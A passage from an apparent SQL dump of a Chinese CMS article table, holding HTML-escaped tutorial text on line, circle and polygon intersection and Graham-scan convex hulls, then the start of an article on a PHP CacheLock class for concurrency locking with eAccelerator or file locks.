lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是否相交（方法已在前文讨论过），如果不相交则没有交点，否则说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;一定有交点，下面就将&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;都看作直线来考虑。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;span lang=&quot;EN-US&quot;&gt;2&lt;/span&gt;．如果&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;横坐标相同，即&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;a) &lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;也平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　&lt;span lang=&quot;EN-US&quot;&gt;i. &lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;的纵坐标和&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;的纵坐标相同，说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;共线，假如&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是直线的话他们有无穷的交点，假如&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是线段的话可用&lt;span lang=&quot;EN-US&quot;&gt;&quot;&lt;/span&gt;计算两条共线线段的交点&lt;span lang=&quot;EN-US&quot;&gt;&quot;&lt;/span&gt;的算法求他们的交点（该方法在前文已讨论过）；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　&lt;span lang=&quot;EN-US&quot;&gt;ii. &lt;/span&gt;否则说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;平行，他们没有交点；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;b) &lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;不平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，则交点横坐标为&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;的横坐标，代入到&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;的直线方程中可以计算出交点纵坐标；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;span lang=&quot;EN-US&quot;&gt;3&lt;/span&gt;．如果&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;横坐标不同，但是&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;Q2&lt;/span&gt;横坐标相同，即&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，则交点横坐标为&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;的横坐标，代入到&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;的直线方程中可以计算出交点纵坐标；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;span lang=&quot;EN-US&quot;&gt;4&lt;/span&gt;．如果&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;纵坐标相同，即&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;a) &lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;也平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴，&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　&lt;span lang=&quot;EN-US&quot;&gt;i. &lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;的横坐标和&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;的横坐标相同，说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;共线，假如&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是直线的话他们有无穷的交点，假如&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是线段的话可用&lt;span lang=&quot;EN-US&quot;&gt;&quot;&lt;/span&gt;计算两条共线线段的交点&lt;span lang=&quot;EN-US&quot;&gt;&quot;&lt;/span&gt;的算法求他们的交点（该方法在前文已讨论过）；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　&lt;span lang=&quot;EN-US&quot;&gt;ii. &lt;/span&gt;否则说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;平行，他们没有交点；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;b) &lt;/span&gt;若&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;不平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴，则交点纵坐标为&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;的纵坐标，代入到&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;的直线方程中可以计算出交点横坐标；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;span lang=&quot;EN-US&quot;&gt;5&lt;/span&gt;．如果&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;纵坐标不同，但是&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;Q2&lt;/span&gt;纵坐标相同，即&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴，则交点纵坐标为&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;的纵坐标，代入到&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;的直线方程中可以计算出交点横坐标；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;span lang=&quot;EN-US&quot;&gt;6&lt;/span&gt;．剩下的情况就是&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;的斜率均存在且不为&lt;span lang=&quot;EN-US&quot;&gt;0&lt;/span&gt;的情况&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;a) &lt;/span&gt;计算出&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;的斜率&lt;span lang=&quot;EN-US&quot;&gt;K0&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;的斜率&lt;span lang=&quot;EN-US&quot;&gt;K1 &lt;/span&gt;；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;b) &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;K1= K2 &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　&lt;span lang=&quot;EN-US&quot;&gt;i. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;上，则说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;共线，假如&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是直线的话有无穷交点，假如&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;是线段的话可用&lt;span lang=&quot;EN-US&quot;&gt;&quot;&lt;/span&gt;计算两条共线线段的交点&lt;span lang=&quot;EN-US&quot;&gt;&quot;&lt;/span&gt;的算法求他们的交点（该方法在前文已讨论过）；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　　&lt;span lang=&quot;EN-US&quot;&gt;ii. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;Q1&lt;/span&gt;不在&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;上，则说明&lt;span lang=&quot;EN-US&quot;&gt;L0&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;L1&lt;/span&gt;平行，他们没有交点。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;c) &lt;/span&gt;联立两直线的方程组可以解出交点来&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　这个算法并不复杂，但是要分情况讨论清楚，尤其是当两条线段共线的情况需要单独考虑，所 以在前文将求两条共线线段的算法单独写出来。另外，一开始就先利用矢量叉乘判断线段与线段（或直线）是否相交，如果结果是相交，那么在后面就可以将线段全部看作直线来考虑。需要注意的是，我们可以将直线或线段方程改写为&lt;span lang=&quot;EN-US&quot;&gt;ax+by+c=0&lt;/span&gt;的形式，这样一来上述过程的部分步骤可以合并，缩短了代码长度，但是由于先要求出参数，这种算法将花费更多的时间。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;求线段或直线与折线、矩形、多边形的交点&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　分别求与每条边的交点即可。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;求线段或直线与圆的交点&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot; lang=&quot;EN-US&quot;&gt;:&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　设圆心为&lt;span lang=&quot;EN-US&quot;&gt;O&lt;/span&gt;，圆半径为&lt;span lang=&quot;EN-US&quot;&gt;r&lt;/span&gt;，直线（或线段）&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;上的两点为&lt;span lang=&quot;EN-US&quot;&gt;P1,P2&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;1. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;是线段且&lt;span lang=&quot;EN-US&quot;&gt;P1&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;P2&lt;/span&gt;都包含在圆&lt;span lang=&quot;EN-US&quot;&gt;O&lt;/span&gt;内，则没有交点；否则进行下一步。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;2. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　&lt;span lang=&quot;EN-US&quot;&gt;a) &lt;/span&gt;计算圆心到&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;的距离&lt;span lang=&quot;EN-US&quot;&gt;dis&lt;/span&gt;；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　&lt;span lang=&quot;EN-US&quot;&gt;b) &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;dis&amp;gt; r &lt;/span&gt;则&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和圆没有交点；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　　&lt;span lang=&quot;EN-US&quot;&gt;c) &lt;/span&gt;利用勾股定理，可以求出两交点坐标，但要注意考虑&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和圆的相切情况。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;3. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴，做法与&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;平行于&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴的情况类似；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;4. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;既不平行&lt;span lang=&quot;EN-US&quot;&gt;X&lt;/span&gt;轴也不平行&lt;span lang=&quot;EN-US&quot;&gt;Y&lt;/span&gt;轴，可以求出&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;的斜率&lt;span lang=&quot;EN-US&quot;&gt;K&lt;/span&gt;，然后列出&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;的点斜式方程，和圆方程联立即可求解出&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;和圆的两个交点；&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;5. &lt;/span&gt;如果&lt;span lang=&quot;EN-US&quot;&gt;L&lt;/span&gt;是线段，对于&lt;span lang=&quot;EN-US&quot;&gt;2&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;3&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;4&lt;/span&gt;中求出的交点还要分别判断是否属于该线段的范围内。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;color:#074483;&quot;&gt;凸包的概念&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　点集&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;的凸包&lt;span lang=&quot;EN-US&quot;&gt;(convexhull)&lt;/span&gt;是指一个最小凸多边形，满足&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;中的点或者在多边形边上或者在其内。下图中由红色线段表示的多边形就是点集&lt;span lang=&quot;EN-US&quot;&gt;Q={p0,p1,...p12}&lt;/span&gt;的凸包。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;img src=&quot;file:///C:/DOCUME%7E1/ADMINI%7E1/LOCALS%7E1/Temp/msohtml1/01/clip_image001.gif&quot; height=&quot;32&quot; width=&quot;32&quot; /&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;strong&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;　&lt;span style=&quot;color:#074483;&quot;&gt;凸包的求法&lt;/span&gt;：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　现在已经证明了凸包算法的时间复杂度下界是&lt;span lang=&quot;EN-US&quot;&gt;O(n*logn),&lt;/span&gt;但是当凸包的顶点数&lt;span lang=&quot;EN-US&quot;&gt;h&lt;/span&gt;也 被考虑进去的话，&lt;span lang=&quot;EN-US&quot;&gt;Krikpatrick&lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt;Seidel&lt;/span&gt;的剪枝搜索算法可以达到&lt;span lang=&quot;EN-US&quot;&gt;O(n*logh)&lt;/span&gt;，在渐进意义下达到最优。最常用的凸包算法是&lt;span lang=&quot;EN-US&quot;&gt; Graham&lt;/span&gt;扫描法和&lt;span lang=&quot;EN-US&quot;&gt;Jarvis&lt;/span&gt;步进法。本文只简单介绍一下&lt;span lang=&quot;EN-US&quot;&gt;Graham&lt;/span&gt;扫描法，其正确性的证明和&lt;span lang=&quot;EN-US&quot;&gt;Jarvis&lt;/span&gt;步进法的过程大家可以参考《算法导论》。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　对于一个有三个或以上点的点集&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;Graham&lt;/span&gt;扫描法的过程如下：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　令&lt;span lang=&quot;EN-US&quot;&gt;p0&lt;/span&gt;为&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;中&lt;span lang=&quot;EN-US&quot;&gt;Y-X&lt;/span&gt;坐标排序下最小的点&lt;span lang=&quot;EN-US&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　设&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;p1,p2,...pm&amp;gt;&lt;/span&gt;为对其余点按以&lt;span lang=&quot;EN-US&quot;&gt;p0&lt;/span&gt;为中心的极角逆时针排序所得的点集（如果有多个点有相同的极角，除了距&lt;span lang=&quot;EN-US&quot;&gt;p0&lt;/span&gt;最远的点外全部移除&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　压&lt;span lang=&quot;EN-US&quot;&gt;p0&lt;/span&gt;进栈&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　压&lt;span lang=&quot;EN-US&quot;&gt;p1&lt;/span&gt;进栈&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　压&lt;span lang=&quot;EN-US&quot;&gt;p2&lt;/span&gt;进栈&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;for i ← 3 to m&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;do while &lt;/span&gt;由&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;的栈顶元素的下一个元素、&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;的栈顶元素以及&lt;span lang=&quot;EN-US&quot;&gt;pi&lt;/span&gt;构成的折线段不拐向左侧&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;对&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;弹栈&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;压&lt;span lang=&quot;EN-US&quot;&gt;pi&lt;/span&gt;进栈&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;return S;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:24pt;&quot;&gt;　　此过程执行后，栈&lt;span lang=&quot;EN-US&quot;&gt;S&lt;/span&gt;由底至顶的元素就是&lt;span lang=&quot;EN-US&quot;&gt;Q&lt;/span&gt;的凸包顶点按逆时针排列的点序列。需要注意的是，我们对点按极角逆时针排序时，并不需要真正求出极角，只需要求出任意两点的次序就可以了。而这个步骤可以用前述的矢量叉积性质实现。&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1303778172, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(83, 1, 'PHP并发操作下的加锁', '', '', '有这么一个需求：生成文件的时候，由于多用户都有权限进行生成，防止并发下，导致生成的结果出现错误，需要对生成的过程进行加锁，只容许一个用户在一个时间内进行操作，这个时候就需要用到锁了，将这个操作过程锁起来。在用了cache的时候，cache失效可能导致瞬间的多数并发请求穿透到数据库此时也可以得需要用锁在同一并发的过程中将这个操作锁定。&lt;br /&gt;\r\n&lt;br /&gt;\r\n针对以上的2种情况，现在的解决方法是对处理过程进行锁机制，通过PHP实现如下：&lt;br /&gt;\r\n&lt;br /&gt;\r\n用到了Eaccelerator的内存锁和文件锁，原理：判断系统中是否安了EAccelerator如果有则使用内存锁，如果不存在，则进行文件锁。根据带入的key的不同可以实现多个锁直接的并行处理，类似Innodb的行级锁。&lt;br /&gt;\r\n&lt;br /&gt;\r\n具体类如下：&lt;br /&gt;\r\n&lt;div class=&quot;code&quot;&gt;&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n/**&lt;br /&gt;\r\n * CacheLock 进程锁,主要用来进行cache失效时的单进程cache获取，防止过多的SQL请求穿透到数据库&lt;br /&gt;\r\n * 用于解决PHP在并发时候的锁控制,通过文件/eaccelerator进行进程间锁定&lt;br /&gt;\r\n * 如果没有使用eaccelerator则进行进行文件锁处理，会做对应目录下产生对应粒度的锁&lt;br /&gt;\r\n * 使用了eaccelerator则在内存中处理，性能相对较高&lt;br /&gt;\r\n * 不同的锁之间并行执行，类似mysql innodb的行级锁&lt;br /&gt;\r\n * 本类在sunli的phplock的基础上做了少许修改&amp;nbsp;&amp;nbsp;http://code.google.com/p/phplock &lt;br /&gt;\r\n * @author yangxinqi&lt;br /&gt;\r\n *&lt;br /&gt;\r\n */&lt;br /&gt;\r\nclass CacheLock&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;//文件锁存放路径&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;private $path = null;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;//文件句柄&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;private $fp = null;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;//锁粒度,设置越大粒度越小&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;private $hashNum = 100;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;//cache key &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;private $name;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;//是否存在eaccelerator标志&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;private&amp;nbsp;&amp;nbsp;$eAccelerator = false;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;/**&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * 构造函数&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * 传入锁的存放路径，及cache key的名称，这样可以进行并发&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * @param string $path 锁的存放目录，以&quot;/&quot;结尾&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * @param string $name cache key&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; */&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;public function __construct($name,$path=''lock\\\\'')&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//判断是否存在eAccelerator,这里启用了eAccelerator之后可以进行内存锁提高效率&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$this-&amp;gt;eAccelerator = function_exists(&quot;eaccelerator_lock&quot;);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(!$this-&amp;gt;eAccelerator)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$this-&amp;gt;path = $path.($this-&amp;gt;_mycrc32($name) % $this-&amp;gt;hashNum).''.txt'';&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$this-&amp;gt;name = $name;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;/**&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * crc32&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * crc32封装&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * @param int $string&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * @return int&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; */&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;private function _mycrc32($string)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$crc = abs (crc32($string));&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if ($crc &amp;amp; 0x80000000) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$crc ^= 0xffffffff;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$crc += 1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;return $crc;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;}&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;/**&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * 加锁&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; * Enter description here ...&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; */&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;public function lock()&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//如果无法开启ea内存锁，则开启文件锁&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if(!$this-&amp;gt;eAccelerator)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//配置目录权限可写&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;$this-&amp;gt;fp = fopen($this-&amp;gt;path, ''w+'');&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;if($this-&amp;gt;fp === false)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;br 